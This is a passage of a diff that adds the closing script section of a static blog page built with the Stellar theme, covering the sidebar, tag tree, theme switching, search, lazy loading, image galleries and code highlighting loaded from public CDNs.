+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+      <script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+        <script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+          <!-- required -->
+          <script src="/js/main.js?v=1.29.1" defer></script>
+
+          <script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+            <!-- optional -->
+            
+
+
+              <script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+                
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+                  <!-- inject -->
+                  
+
+                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <script>
+                      hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
+                    </script></div></body></html>
